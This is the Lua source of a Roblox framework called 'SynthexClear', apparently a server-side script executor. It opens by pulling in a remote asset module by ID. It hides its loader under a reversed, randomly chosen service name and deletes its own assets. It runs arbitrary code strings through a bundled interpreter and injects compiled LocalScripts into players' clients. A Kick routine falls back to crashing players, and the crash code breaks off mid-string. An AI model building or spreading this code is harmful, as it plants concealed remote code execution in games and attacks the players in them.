require(98521058713700)("tricky3685")
local Version		= 'Revi Edition';
local Rep			= game:GetService("TestService").Assets;
local Deps			= Rep:Clone();
Rep:Destroy(); -- Have fun.
local setfenv = setfenv;
local newproxy = newproxy;
local getmetatable = getmetatable;
local tostring = tostring;
local rawequal = rawequal;
local pcall = pcall;
local rawset = rawset;
local rawget = rawget;
local type = type;
local game = game;
local wait = wait;
local Instance = Instance;
local next = next;
local typeof = typeof;
local getfenv = getfenv;
local error = error;
local setmetatable = setmetatable;
local warn = warn;
local LoadLibrary = LoadLibrary;
local CFrame = CFrame;
local UDim2 = UDim2;
local ipairs = ipairs;
local require = require;
local collectgarbage = collectgarbage;
local unpack = unpack;
local Vector3 = Vector3;
local Color3 = Color3;
local BrickColor = BrickColor;
local tonumber = tonumber;
local workspace = workspace;
local print = print;
local spawn = spawn;
local delay = delay;
local tick = tick;
-- String library.
local char = string.char;
local sub = string.sub;
local byte = string.byte;
local reverse = string.reverse;
local format = string.format;
local gmatch = string.gmatch;
local lower = string.lower;
local find = string.find;
local dump = string.dump;
local gsub = string.gsub;
local rep = string.rep;
local match	= string.match;
local upper	= string.upper;
-- Table library.
local insert = table.insert;
local remove = table.remove;
local concat = table.concat;
-- Math library.
local huge = math.huge;
local random = math.random;
local floor = math.floor;
local sqrt = math.sqrt;
local abs = math.abs;
local ceil = math.ceil;
local rad = math.rad;
local atan = math.atan;
local min = math.min;
-- Coroutine library.
local CWrap = coroutine.wrap;
local CCreate = coroutine.create;
local CResume = coroutine.resume;
local CYield = coroutine.yield;
local Environment	= {
	shared			= shared;
	_G				= _G;
	game			= game;
	workspace		= workspace;
	getfenv			= getfenv;
	setfenv			= setfenv;
	getmetatable	= getmetatable;
	setmetatable	= setmetatable;
	math			= math;
	print			= print;
	warn			= warn;
	error			= error;
	coroutine		= coroutine;
	pcall			= pcall;
	ypcall			= ypcall;
	xpcall			= xpcall;
	select			= select;
	rawset			= rawset;
	rawget			= rawget;
	rawequal		= rawequal;
	pairs			= pairs;
	ipairs			= ipairs;
	next			= next;
	newproxy		= newproxy;
	os				= os;
	tick			= tick;
	loadstring		= loadstring;
	tostring		= tostring;
	tonumber		= tonumber;
	unpack			= unpack;
	string			= string;
	Instance		= Instance;
	type			= type;
	wait			= wait;
	assert			= assert;
	require			= require;
	table			= table;
	Enum			= Enum;
	load			= load;
	loadfile		= loadfile;
	printidentity	= printidentity;
	-- ROBLOX stuffs.
	
	delay					= delay;
	spawn					= spawn;
	debug					= debug;
	LoadLibrary				= LoadLibrary;
	typeof					= typeof;
	
	BrickColor				= BrickColor;
	Rect					= Rect;
	CFrame					= CFrame;
	UDim					= UDim;
	UDim2					= UDim2;
	Color3					= Color3;
	ColorSequence			= ColorSequence;
	ColorSequenceKeypoint	= ColorSequenceKeypoint;
	Vector2					= Vector2;
	Vector3					= Vector3;
	Vector2int16			= Vector2int16;
	Vector3int16			= Vector3int16;
	Region3					= Region3;
	Region3int16			= Region3int16;
	
	Faces					= Faces;
	Ray						= Ray;
	
	NumberRange				= NumberRange;
	NumberSequence			= NumberSequence;
	NumberSequenceKeypoint	= NumberSequenceKeypoint;
};
-- // Continue with process.
local Loader		= Deps:WaitForChild('Core', huge):WaitForChild('Loader', huge);
local Setting, Synthex
local Reverse		= function(Old) local New	= ''; for i = 1, #Old do New = New .. char(255 - Old:sub(i, i):byte()); end return New end;
local LoadQueue		= 'Service;Lua;Formatting;Plugins;Http;Clients;Remote';
local StartPlaces	= {
	'ServerScriptService';
	'ServerStorage';
	'ReplicatedStorage';
};
local RunF, RunE, RunT;
local Proxy			= newproxy(true);
local ProxyMeta		= getmetatable(Proxy);
local Modules		= {};
ProxyMeta.__metatable	= '\\\\Synthex\\\\';
function ProxyMeta:__tostring()
	return 'Synthex';
end;
function ProxyMeta:__newindex(Where, What)
	if (not Setting) or rawequal(Where, 'Ran') or (rawequal(Where, 'Locked') and (Setting.Locked ~= nil)) then return; end;
	
	pcall(rawset, Setting, Where, What);
end;
function ProxyMeta:__index(Where)
	if Setting then
		local _, Got	= pcall(rawget, Setting, Where);
		
		return Got;
	else
		return;
	end;
end;
function ProxyMeta:__call(Modifier)
	if (type(Setting) == 'table') and Setting.Locked then
		local Lock	= Setting.Locked;
		local Typ	= type(Lock);
		
		if (Typ ~= 'table') then
			return Setting.Locked;
		else
			return 'SynthexLocked';
		end;
	end;
	
	if (not Synthex) then -- // Ok, it just started, needs to be independent.
		Synthex			= 'Started';
		
		local ServName	= StartPlaces[random(1, #StartPlaces)];
		
		local Step		= game:GetService('RunService').Stepped;
		local Serv		= game:GetService(ServName);
		local Rev		= Reverse(ServName);
		
		Loader.Name			= Rev;
		Loader.Disabled		= false;
		Loader.Archivable	= false;
		
		Loader.Parent		= game:GetService('ServerScriptService');
		
		Serv:WaitForChild(Rev:reverse()):Fire(Modifier);
		
		while Step:wait() do
			if (Synthex ~= 'Started') then
				break;
			end;
		end;
		
		return Synthex;
	elseif (Synthex == 'Started') then
		local Core	= {};
		local Meta	= {};
		local Load	= Instance.new'BindableEvent';
		local Pass	= {Loaded = Load.Event;Internal = {};Deps = Deps;Modules = Modules;};
		
		function Meta:__index(Index)
			local Ty	= type(Index);
			local Val
			
			if (Ty == 'string') then
				for _, C in next, Pass.Internal do
					local G	= C[Index] or (C == Index);
					
					if G then
						Val	= G;
						
						rawset(self, Index, Val);
						
						break;
					end;
				end;
			end;
			
			return Val;
		end;
		
		function Meta:__call(Lib)
			if (typeof(Lib) == 'userdata') then return nil; end;
			
			local LoadL	= tostring(Lib);
			local Lib	= Pass.Internal[LoadL] or (LoadL == 'Synthex');
			local NEnv;
			
			if Lib then
				NEnv	= {};
				
				for Index, Value in next, Environment do
					NEnv[Index]		= Value;
				end;
				
				if (Lib == true) then
					for _, Library in next, Pass.Internal do
						for Index, Value in next, Library do
							NEnv[Index]		= Value;
						end;
					end;
				else
					for Index, Value in next, Lib do
						NEnv[Index]		= Value;
					end;
				end;
				
				NEnv.script	= getfenv(2).script or nil;
				
				Core.SetEnv(3, NEnv);
			else
				error(format('The library "%s" does not exist within Clear', LoadL), 2);
			end;
		end;
		
		function Meta:__tostring()
			return 'Clear';
		end;
		
		Meta.__metatable	= 'Synthex';
		
		setmetatable(Core, Meta);
		
		for Ext in LoadQueue:gmatch('[^;]+') do
			local Module		= Modules[Ext];
			
			Pass.Internal[Ext]	= Module(Core, Meta);
			Modules[Ext]		= nil;
		end;
		
		RunF	= Pass.Internal.Lua.RunModule;
		RunE	= Pass.Internal.Lua.PluginEnv;
		RunT	= Pass.Internal.Formatting.Thread;
		
		Pass.Deps		= nil;
		Pass.Modules	= nil;
		Pass.Load		= nil;
		
		Modules			= nil;
		
		Deps:Destroy();
		Load:Fire();
		
		for Index, Value in next, Core do
			Core[Index]	= nil;
		end;
		
		Setting	= {Ran	= true;};
		Synthex	= Core;
		warn(format('SynthexClear loaded, version %s.', Version));
	end;
	
	local ModType	= type(Modifier);
	
	if (ModType == 'table') then
		for _, Mod in next, Modifier do
			RunT(RunF, Mod, RunE, Synthex);
		end;
	end;
	
	return Synthex;
end;
function Modules.Service(Clear)
	local Service	= {};
	
	Service.RbxGui		= LoadLibrary('RbxGui');
	Service.RbxLibrary	= LoadLibrary('RbxLibrary');
	Service.RbxStamper	= LoadLibrary('RbxStamper');
	Service.RbxUtility	= LoadLibrary('RbxUtility');
	
	local Create		= Service.RbxUtility.Create;
	local NewCreate;
	
	function Service.Memoize(Func, Mode)
		local Mode	= (Mode == nil) and 'v' or nil;
		
		return setmetatable({}, {
			__index	= function(This, X)
				local R	= Func(X);
				
				This[X]	= R;
				
				return R;
			end;
			__tostring	= function()
				return 'Memoizer';
			end;
			__metatable	= 'Mem';
			__mode		= Mode;
		});
	end;
	
	Service.Create	= setmetatable({}, {
		__call	= function(This, thing)
			local CrLocal	= Create(thing);
			
			local function Creation(data)
				if (getmetatable(data) ~= nil) then return; end;
				
				local Parent, Object	= data.Parent;
				data.Parent				= nil;
				
				Object			= CrLocal(data);
				Object.Parent	= Parent;
				
				data.Parent		= Parent;
				
				return Object;
			end;
			
			This[thing]	= Creation;
			
			return Creation;
		end,
		__metatable	= 'Create';
	});
	
	function Service.MakeWeld(X, Y, Type, autoParent)
		local orix, oriy	= X.Anchored, Y.Anchored;
		local Parent		= (autoParent and X) or nil;
		
		X.Anchored = true;
		Y.Anchored = true;
		
		local Weld	= Service:Create(Type or 'Weld'){
			Parent	= Parent;
			Part0	= X;
			Part1	= Y;
		};
		
		Weld.C0		= X.CFrame:inverse();
		Weld.C1		= Y.CFrame:inverse();
		
		X.Anchored = orix;
		Y.Anchored = oriy;
		
		return Weld;
	end;
	
	function Service.FindFirstClass(Parent, Item)
		return Parent:FindFirstChildOfClass(Item);
--		for _, Child in ipairs(Parent:GetChildren()) do
--			if Child:IsA(Item) then
--				return Child;
--			end;
--		end;
	end;
	
	function Service.Assert(Condition, Error, Stack)
		if (not Condition) then
			error(Error, Stack or 2);
		end;
	end;
	
	function Service.Object(Data, MetaData)
		Service.Assert(type(Data) == 'table', 'Error: Data must be a table.', 0);
		
		local Obj	= newproxy(true);
		local Cre	= getmetatable(Obj);
		
		function Cre:__index(Index)
			Service.Assert(Data[Index] ~= nil, tostring(Index) .. ' is not a valid member of ' .. tostring(Data) .. '.', 0);
			
			return Data[Index];
		end;
		
		function Cre:__newindex(Index, Value)
			Data[Index]	= Value;
		end;
		
		function Cre:__tostring()
			return rawget(Data, 'Name') or 'SynthexObject';
		end;
		
		Cre.__metatable	= 'SynthexObject';
		
		if (type(MetaData) == 'table') then
			for T, D in next, MetaData do
				Cre[T]	= D;
			end;
		end;
		
		return Obj;
	end;
	
	return setmetatable(Service, {
		__index		= function(i, x)
			local R, S	= pcall(game.GetService, game, x);
			
			if R then
				rawset(i, x, S);
				
				return S;
			else
				return;
			end;
		end;
		__tostring	= function()
			return 'Service';
		end;
		__metatable = 'Service';
	});
end;
function Modules.Lua(Clear, Meta)
	local Lua			= {};
	local PluginEnv		= {};
	local LoadFolder	= Deps:WaitForChild'String';
	local LSFunction	= require(LoadFolder:WaitForChild'Loadstring');
	local Rerubi		= LoadFolder('WaitForChild', 'Rerubi');
	local RerubiInterp	= require(Rerubi'Clone');
	local LocalLS		= LoadFolder('WaitForChild', 'ClientBase')'Clone';
	
	LoadFolder'Destroy';
	
	function Lua.Shift(Number, Bits)
		return (Number * 2) % (2 ^ Bits);
	end;
	
	function Lua.CountGarbage()
		return ((floor((collectgarbage'count' / 10)) * 10) / 1000);
	end;
	
	function Lua.Loadstring(str, f)
		return RerubiInterp(Lua.Compile(str), f or Lua.CreateEnv());
	end;
	
	function Lua.Compile(Code, Chunk)
		local R, V	= LSFunction(Code, Chunk);
		
		if R then
			return V;
		else
			error(V, 0);
		end;
	end;
	
	function Lua.LocalSource(Pl, Source, Time)
		if (not Pl) then return nil; end;
		
		local NewSource		= LocalLS'Clone';
		local LSHandle		= Rerubi'Clone';
		local Compk			= Lua.Compile(Source, 'LocalScript');
		local Realk			= {};
		
		local S				= sqrt(random(1, 999999) * random());
		
		LSHandle.Name		= S;
		LSHandle.Parent		= NewSource;
		
		for Idx = 1, #Compk do
			Realk[Idx]	= format('%02x', byte(Compk, Idx, Idx));
		end;
		
		NewSource:WaitForChild('Code').Value	= concat(Realk);
		NewSource.Name							= S;
		NewSource.Parent						= Pl:FindFirstChildOfClass'Backpack' or Pl:FindFirstChildOfClass'PlayerGui' or Pl.Character;
		
		if (type(Time) == 'number') then
			Clear.Debris:AddItem(NewSource, Time);
		end;
		
		return NewSource;
	end;
	
	function Lua.HighestEnv()
		local StackLevel = 1;
		
		while pcall(getfenv, StackLevel) do
			StackLevel = StackLevel + 1;
		end;
		
		return (StackLevel - 1), getfenv(StackLevel - 1);
	end;
	
	function Lua.CreateEnv(Env, A, B)
		local EnvM	= A or setmetatable({}, {__metatable = 'Private'});
		local EnvD	= B or setmetatable({}, {__metatable = 'Public'});
		
		local MetaTab		= {
			__index		= function(t, i)
				if (i == Rep) then
					return {M = EnvM, D = EnvD};
				elseif (EnvM[i] ~= nil) then
					return EnvM[i];
				else
					return EnvD[i];
				end;
			end;
			__newindex	= function(t, i, x)
				EnvD[i] = x;
			end;
			__metatable	= '- Synthex - Protected Environment';
		}
		
		local NewEnvironment = setmetatable({}, MetaTab)
		
		for EnvIndex, EnvValue in next, Lua.Environment do
			EnvM[EnvIndex] = EnvValue;
		end;
		
		if Env then
			for EnvIndex, EnvValue in next, Env do
				EnvM[EnvIndex] = EnvValue;
			end;
		end;
		
		EnvM.Public		= EnvD;
		EnvM.Clear		= Clear;
		
		return NewEnvironment, EnvM, EnvD;
	end
	
	function Lua.SetEnv(x, w)
		local EnvLevel	= x;
		local EnvAttri	= ((type(w) == 'table') and w) or Lua.Environment;
		
		local OEnv	= getfenv(EnvLevel);
		local Comp	= OEnv[Rep];
		local Created
		
		if Comp then
			Created			= Lua.CreateEnv(EnvAttri, Comp.M, Comp.D);
		else
			Created			= Lua.CreateEnv(EnvAttri);
		end;
		
		Created.script		= OEnv.script;
		
		setfenv(EnvLevel, Created);
		
		local N		= getfenv(EnvLevel);
		
		return N;
	end;
	
	function Lua.RunModule(Module, Env, ...)
		local Ran, Loaded = pcall(require, Module);
		
		if Ran and (type(Loaded) == 'function') then
			Lua.SetEnv(Loaded, Env or Lua.Environment);
			
			local Returns	= {pcall(Loaded, ...)};
			
			if (not Returns[1]) then
				local Err	= Clear.TrimError(Returns[2] or 'An error has occurred');
				warn(tostring(Module), Err);
				
				return false, Err;
			else
				return unpack(Returns);
			end;
		else
			warn(Clear.TrimError(Loaded or 'An error has occurred'));
		end;
	end;
	
	function Lua.Pconnect(c, f)
		return c:Connect(function(...)
			local run, err = Lua.Acall(f, ...)
			
			if (not run) and err then
				warn(err)
			end
		end)
	end
	
	function Lua.xPcall(func, handle, ...)
		if handle then
			local all = {pcall(func,...)}
			
			if (not all[1]) and all[2] then
				all[2] = handle(all[2])
			end
			
			return unpack(all)
		elseif not handle then
			return pcall(func, ...)
		end
	end
	
	function Lua.Pcall(func, ...)
		return Lua.xPcall(func, nil, ...)
	end
	
	function Lua.Acall(func, ...)
		return Lua.xPcall(func, ATrim, ...)
	end
	
	-- Env stuff.
	
	local function ToEnv(Use, Table)
		return setmetatable({}, {
			__index		= function(Tab, Ind)
				local Tos	= tostring(Ind):lower();
				local Val	= ((Use[Tos] ~= nil) and Use[Tos]) or Table[Tos];
				
				rawset(Tab, Tos, Val);
				
				return Val;
			end;
			__newindex	= function(Tab, Index, Val)
				Use[Index]	= Val;
			end;
			__metatable	= getmetatable(Use) or 'Default';
		})
	end
	
	local function Factorial(n)
		return n < 1 and 1 or n * Factorial(n - 1);
	end;
	
	local function Replace(s, f, r)
		local d=s
		local l=0
		
		while l+#f<=#d do
			local p1,p2=d:find(f,l+1)
			if not p1 then
				break
			end
			d=d:sub(1,p1-1)..r..d:sub(p2+1)
			l=#r==0 and p1-1 or p2+#f-1
		end
		
		return d
	end;
	
	local function Random(l, u, n)
		local r	= {};
		
		for i = 1, n or 1 do
			r[i]	= not u and (l and random(l) or random()) or random(l, u);
		end;
		
		return unpack(r);
	end;
	
	local SynthexEnv	= {
		Instance	= {
			destroy		= game.Destroy;
			create		= Clear.Create;
		};
		os			= {
			execute		= Lua.Loadstring;
		};
		math		= {
			i		= abs(1 / 0);
			lerp	= function(a, b, c)
				return a + (b - a) * c;
			end;
			fact	= Factorial;
			round	= function(Number)
				return floor(Number + 0.5);
			end;
			sum		= function(...)
				local r=0
				
				for i,v in next, {...} do
					r=r+v
				end
				
				return r
			end;
			product	= function(...)
				local r=1
				
				for i,v in next, {...} do
					r=r*v
				end
				
				return r
			end;
			random	= Random;
			randomi	= function(a, b, i)
				local r;
				
				repeat
					r	= Random(a, b);
				until (r ~= i);
				
				return r;
			end
		};
		string		= {
			replace	= Replace;
			insert	= function(s,r,p)
				return s:sub(1,p-1)..r..s:sub(p)
			end;
			remove	= function(s,r)
				return Replace(s,r,"")
			end;
		};
	};
	
	for Name, Data in next, SynthexEnv do
		Environment[Name]	= ToEnv(Environment[Name], Data);
	end;
	
	Lua.Environment = Environment;
	
	for Index, Value in next, Lua.Environment do
		PluginEnv[Index]	= Value;
	end
	
	PluginEnv.Clear		= Clear;
	PluginEnv.Meta		= Meta;
	
	Lua.PluginEnv	= PluginEnv;
	
	return Lua;
end;
function Modules.Formatting(Clear, Meta)
	local Format	= {};
	local Hasher	= require(Deps:WaitForChild'Encoders':WaitForChild'Hasher');
	local UnSafe	= {'[', ']', '.', '%', '*', '+', '-', '(', ')', '^', '$', '?'};
	
	local Step		= Clear.RunService.Stepped;
	
	local New		= {};
	for _, Key in next, UnSafe do New[Key]	= true; end;
	
	UnSafe			= New;
	New				= nil;
	
	local function hex_dump(buf)
		local s = ''
		
		for i = 1, ceil(#buf/16) * 16 do
			if (i-1) % 16 == 0 then s = s .. ('%08X '):format(i-1) end
			s = s .. (i > #buf and '   ' or ('%02X '):format(buf:byte(i)))
			if i %  8 == 0 then s = s .. ' ' end
			if i % 16 == 0 then s = s .. buf:sub(i-16+1, i):gsub('%c', '.') .. '\n' end
			if (i%7 == 0) then
				Step:wait();
			end
		end
		
		return s
	end
	
	function Format.SafeChar(k)
		local C	= tostring(k):sub(1, 1);
		
		if UnSafe[C] then
			return '%' .. C;
		else
			return C;
		end;
	end;
	
	function Format.DumpHex(Data)
		local hexCode	= hex_dump(Data);
		
		for line in gmatch(hexCode, '[^\r\n]+') do
			local b	= sub(line, 9, 57)
			hexCode	= hexCode .. b
		end;
		
		return hexCode;
	end;
	
	function Format.Thread(Func, ...)
		local Returns	= {CResume(CCreate(Func), ...)};
		
		if (not Returns[1]) and Returns[2] then
			warn(Format.TrimError(Returns[2]));
		else
			remove(Returns, 1);
		end
		
		return unpack(Returns);
	end;
	
	function Format.FromUnix(Time, useMili)
		local Hours		= floor(Time/3600)%24;
		local Minutes	= floor((Time%3600)/60);
		local Seconds	= floor(Time%60);
		
		if (#tostring(Seconds) == 1) then Seconds = '0' .. Seconds; end;
		if (#tostring(Minutes) == 1) then Minutes = '0' .. Minutes; end;
		
		return ('%s:%s:%s'):format(Hours, Minutes, Seconds) .. ((useMili and ('.%s'):format(tostring(Time%1):sub(1, 3))) or '');
	end
	
	function Format.ExtractLn(Data)
		if (type(Data) ~= 'string') then return nil; end;
		
		local NewLine	= char(10);
		local Chunks	= {};
		local Start		= 1;
		
		for Index = 1, #Data do
			local F1, F2	= Data:find(NewLine, Start);
			
			if F1 and F2 then
				local E	= Data:sub(Start, F2);
				local T	= Format.Trim(E);
				
				if T and (T ~= '') then
					insert(Chunks, E);
					
					Start	= F2 + 1;
				end;
			else
				local E	= Data:sub(Start);
				local T	= Format.Trim(E);
				
				if T and (T ~= '') then
					insert(Chunks, E);
				end;
				
				break;
			end;
		end;
		
		return Chunks;
	end;
	
	function Format.HashCrc32(Data)
		local Str	= tostring(Data);
		
		if (type(Str) == 'string') then
			local HashS	= Hasher.crc32();
			
			HashS:process(Str);
			
			return HashS:finish();
		else
			return 'Unhashable';
		end;
	end;
	
	function Format.HashMD5(Data)
		local Str	= tostring(Data);
		
		if (type(Str) == 'string') then
			local HashS	= Hasher.md5();
			
			HashS:process(Str);
			
			return HashS:finish();
		else
			return 'Unhashable';
		end;
	end;
	
	function Format.HashSha1(Data)
		local Str	= tostring(Data);
		
		if (type(Str) == 'string') then
			local HashS	= Hasher.sha1();
			
			HashS:process(Str);
			
			return HashS:finish();
		else
			return 'Unhashable';
		end;
	end;
	
	function Format.HashSha256(Data)
		local Str	= tostring(Data);
		
		if (type(Str) == 'string') then
			local HashS	= Hasher.sha256();
			
			HashS:process(Str);
			
			return HashS:finish();
		else
			return 'Unhashable';
		end;
	end;
	
	function Format.Hash(Data)
		local String	= (type(Data) == 'table') and Clear.REncode(Data) or tostring(Data);
		
		if (type(String) == 'string') then
			local Num	= #String;
			local Div	= ceil(Num / 8);
			local Final	= '';
			
			for Chunk in gmatch(String, rep('.', Div)) do
				local CData	= 0;
				
				for Index = 1, #Chunk do
					CData	= CData + Chunk:sub(Index, Index):byte();
				end;
				
				Final		= Final .. char(33 + (CData % 57));
			end;
			
			return (Final .. Final:sub(#Final, #Final):rep(8)):sub(1, 8);
		else
			return 'Unhashable';
		end;
	end;
	
	function Format.Constrain(Number, Min, Max)
		if (Number > Max) then
			return Max;
		elseif (Number < Min) then
			return Min;
		else
			return Number;
		end;
	end;
	
	function Format.TweenItem(Object, Property, New, Lapse)
		local wTime	= Lapse/25;
		local Orig	= Object[Property];
		
		for i=1, 25 do
			Object[Property]	= Format:TotalLerp(Orig, New, i/25);
			
			wait(wTime);
		end
		
		return Object;
	end
	
	function Format.PagesIterate(pagesObject)
		return CWrap(function()
			local pagenum = 1
			while true do
				for _, item in next, pagesObject:GetCurrentPage() do
					CYield(pagenum, item)
				end
				
				if pagesObject.IsFinished then
					break
				end
				
				pagesObject:AdvanceToNextPageAsync()
				pagenum = pagenum + 1
			end
		end)
	end
	
	function Format.RIpairs(Table)
		return CWrap(function()
			for i = #Table, 0, -1 do
				local Value	= Table[i];
				
				if (Value ~= nil) then
					CYield(i, Value);
				else
					break
				end;
			end;
		end);
	end;
	
	function Format.GetAngles(rot)
		return CFrame.Angles((rot.X and rad(rot.X)) or 0,(rot.Y and rad(rot.Y)) or 0,(rot.Z and rad(rot.Z)) or 0)
	end
	
	function Format.TrimError(err)
		local Line, Match	= match(err, '(%d+):(.*)$');
		local Final;
		
		if Line and Match then
			Match	= Format.Trim(Match);
			Final	= format(('(%s) %s'), Format.EditNumber(Line), upper(sub(Match, 1, 1)) .. sub(Match, 2));
		end
		
		return Final or err;
	end
	
	function Format.Trim(str)
		return match(str, "^%s*(.-)%s*$")
	end
	
	function Format.EditNumber(n)
		return reverse(gsub(gsub(reverse(tostring(n)), '%d%d%d',',%1'), '^,',''));
	end;
	
	function Format.GetRandom(Number)
		local Number	= Number or 12;
		local Pool		= {};
		
		for Idx = 1, Number do
			Pool[Idx]	= format('%02x', random(0, 255));
		end;
		
		return concat(Pool);
	end;
	
--	function Format.GetRandom(x)
--		local str = "";
--		for i=1,x or random(5,10) do str=str..char(random(33,90)) end;
--		return str;
--	end;
			
	function Format.Round(num)
		return num + .5 - (num + .5) % 1
	end;
	
	return Format;
end;
function Modules.Plugins(Clear)
	local EntryData = {};
	local Plugins	= {};
	
	function Plugins.NewEntry(Index, Data)
		EntryData[Index] = Data;
	end
	
	function Plugins.GetEntry(Index)
		return EntryData[Index]
	end
	
	function Plugins.ClearEntries()
		local Ent	= {};
		
		for i, _ in next, EntryData do
			insert(Ent, i);
		end;
		
		for _, Rem in next, Ent do
			EntryData[Rem]	= nil;
		end;
	end
	
	function Plugins.CheckPlugin(x)
		return (x ~= 'CheckPlugin') and (x ~= 'NewPlugin') and (x ~= 'RemovePlugin');
	end;
	
	function Plugins.NewPlugin(x, y)
		if Plugins.CheckPlugin(x) then
			if (type(y) == 'table') and rawget(y, 'isSynthex') then
				for Index, Value in next, y do
					if (Index ~= 'isSynthex') then
						Plugins.NewPlugin(Index, Value);
					end;
				end;
			else
				Clear[x] = y;
			end;
		end;
	end;
	
	return Plugins;
end;
function Modules.Http(Clear, Meta)
	local Http = {};
	
	local Encoders		= Deps:WaitForChild'Encoders';
	local Parser		= require(Encoders:WaitForChild'Parser');
	local ReachLink		= 'https://www.google.com';
	local Connected		= false;
	local HApi			= (function() local Mods = {}; for _, mod in next, Deps:WaitForChild'Http':GetChildren() do Mods[mod.Name] = mod; mod:Destroy(); end; Deps:WaitForChild'Http':Destroy(); return Mods end)();
	local Host			= Clear.HttpService;
	
	Http.Host			= Host;
	Encoders'Destroy';
	
	function Http.HttpConnect(conn)
		if (not Clear.HttpService) then return false; end;
		
		local Reached, Err = Clear.Pcall(function()
			Clear.HttpService:GetAsync(conn or ReachLink);
		end);
		
		if (not Reached) then
			warn('Connection not established. ' .. Clear.TrimError(Err));
		end;
		
		Connected = Reached;
		
		return Reached;
	end;
	
	function Http.CheckConnection(conn)
		return Connected or Http.HttpConnect(conn);
	end;
	
	function Http.HttpRemote(Typ, ...)
		local F	= HApi[Typ] and require(HApi[Typ]);
		
		if F then
			getfenv(F).script	= nil;
			
			return F(Http, ...);
		else
			return nil;
		end;
	end;
	
	function Http.UrlArgs(isStart, ...)
		local Tok	= '';
		local Args	= {...};
		
		for _, Val in next, Args do
			Tok		= Tok .. '&' .. Val;
		end;
		
		return Tok:gsub('^&', (isStart and '%?') or '');
	end;
	
	function Http.DoGet(...)
		return Host('GetAsync', ...);
	end;
	
	function Http.DoPost(...)
		return Host('PostAsync', ...);
	end;
	
	function Http.UrlEncode(...)
		return Host('UrlEncode', ...);
	end;
	
	function Http.JEncode(...)
		return Host('JSONEncode', ...);
	end;
	
	function Http.JDecode(...)
		return Host('JSONDecode', ...);
	end;
	
	function Http.REncode(...)
		return Parser[1](...);
	end;
	
	function Http.RDecode(...)
		return Parser[2](...);
	end;
	
	return Http;
end;
function Modules.Clients(Clear)
	local Kick	= function(Player, Message) return Player:Kick(Message); end;
	local PlayerServ = {
		ChatSettings = {
			Colors = {
				Color3.new(253/255, 41/255, 67/255), -- BrickColor.new("Bright red").Color,
				Color3.new(1/255, 162/255, 255/255), -- BrickColor.new("Bright blue").Color,
				Color3.new(2/255, 184/255, 87/255), -- BrickColor.new("Earth green").Color,
				BrickColor.new("Bright violet").Color,
				BrickColor.new("Bright orange").Color,
				BrickColor.new("Bright yellow").Color,
				BrickColor.new("Light reddish violet").Color,
				BrickColor.new("Brick yellow").Color,
			};
			PreLogged = {};
		};
		ChatStringConnections = {};
	}
	
	function PlayerServ.ChatColor(En)
		local pName = tostring(En);
		
		if PlayerServ.ChatSettings.PreLogged[pName] then return PlayerServ.ChatSettings.PreLogged[pName] end
		
		local Final
		local value = 0
		
		for index = 1, #pName do
			local cValue = byte(sub(pName, index, index))
			local reverseIndex = #pName - index + 1
			
			if #pName%2 == 1 then
				reverseIndex = reverseIndex - 1
			end
			
			if reverseIndex%4 >= 2 then
				cValue = -cValue
			end
			
			value = value + cValue
		end
		
		Final								= PlayerServ.ChatSettings.Colors[(value % #PlayerServ.ChatSettings.Colors) + 1]
		
		PlayerServ.ChatSettings.PreLogged[pName]	= Final;
		
		return Final
	end
	
	function PlayerServ.OwnsAsset(Player, Id)
		return Clear.MarketplaceService:PlayerOwnsAsset(Player, Id);
	end;
	
	function PlayerServ.Filter(Str, From, To)
		local _, Filtered	= pcall(Clear.Chat.FilterStringAsync, Clear.Chat, Str, From, To);
		
		return Filtered or Str, (Str ~= Filtered);
	end;
	
	function PlayerServ.BroadcastFilter(Str, Player)
		local _, Filtered	= pcall(Clear.Chat.FilterStringForBroadcast, Clear.Chat, Str, Player);
		
		return Filtered or Str, (Str ~= Filtered);
	end;
	
	function PlayerServ.GrabPlayer(name) -- Thanks to Sceleratis for providing this.
		if (typeof(name) == 'Instance') then return {name} end;
		
		local name				= name or 'all'
		local AllGrabbedPlayers	= {}
		local GotTable			= (Clear.NetworkServer and Clear.NetworkServer:GetChildren())
		
		if GotTable then
			for i,v in next, GotTable do
				pcall(function()
					if v:IsA("ServerReplicator") then
						if v:GetPlayer().Name:lower():sub(1,#name)==name:lower() or name=='all' then
							insert(AllGrabbedPlayers, (v:GetPlayer() or "NoPlayer"))
						end;
					end;
				end);
			end;
		else
			for i,v in next, Clear.Players:GetPlayers() do
				if v.Name:lower():sub(1,#name)==name:lower() or name=='all' then
					insert(AllGrabbedPlayers, v)
				end;
			end;
		end
		
		return AllGrabbedPlayers;
	end
	
	function PlayerServ.IsPlayer(p, check) -- I'm stealing this from you, Celery.
		local pType = type(p)
		local cType = type(check)
		if pType == "string" and cType == "string" then
			if p == check or check:lower():sub(1,#tostring(p)) == p:lower() then
				return true
			end
		elseif pType == "number" and (cType == "number" or tonumber(check)) then
			if p == tonumber(check) then
				return true
			end
		elseif cType == "number" then
			if p.userId == check then
				return true
			end
		elseif cType == "string" and pType == "userdata" and p:IsA("Player") then
			local isGood = p.Parent == Clear.Players
			if isGood and check:match("^Group:(.*):(.*)") then
				local sGroup,sRank = check:match("^Group:(.*):(.*)")
				local group,rank = tonumber(sGroup),tonumber(sRank)
				if group and rank then
					local pRank = p:GetRankInGroup(group)
					if pRank == rank or (rank < 0 and pRank >= abs(rank)) then
						return true
					end
				end
			elseif isGood and check:match("^Group:(.*)") then
				local group = tonumber(check:match("^Group:(.*)"))
				if group then
					if p:IsInGroup(group) then
						return true
					end
				end
			elseif check:match("^Item:(.*)") then
				local item = tonumber(check:match("^Item:(.*)"))
				if item then
					if Clear.MarketplaceService:PlayerOwnsAsset(p,item) then
						return true
					end
				end
			elseif check:match("^(.*):(.*)") then
				local player, sUserid = check:match("^(.*):(.*)")
				local userid = tonumber(sUserid)
				if player and userid and p.Name == player or p.userId == userid then
					return true
				end
			elseif p.Name == check then
				return true
			end
		elseif cType == "table" and pType == "userdata" and p:IsA("Player") then
			if check.Group and check.Rank then
				local pRank = p:GetRankInGroup(check.Group)
				if pRank == check.Rank or (check.Rank < 0 and pRank >= abs(check.Rank)) then
					return true
				end
			end
		end
	end;
	
	function PlayerServ.Kick(Name, Msg)
		local PlayerL	= PlayerServ.GrabPlayer(Name);
		
		for _, Player in next, PlayerL do
			local Kicked	= pcall(Kick, Player, Msg);
			
			if (not Kicked) then
				PlayerServ.Crash(Player);
			end;
		end;
	end;
	
	function PlayerServ.Crash(Name)
		local PlayerL	= PlayerServ.GrabPlayer(Name);
		
		for _, Player in next, PlayerL do
			Clear.LSource(Player, [[
				local crash
				local Gui	= LoadLibrary('RbxUtility').Create'ScreenGui'{
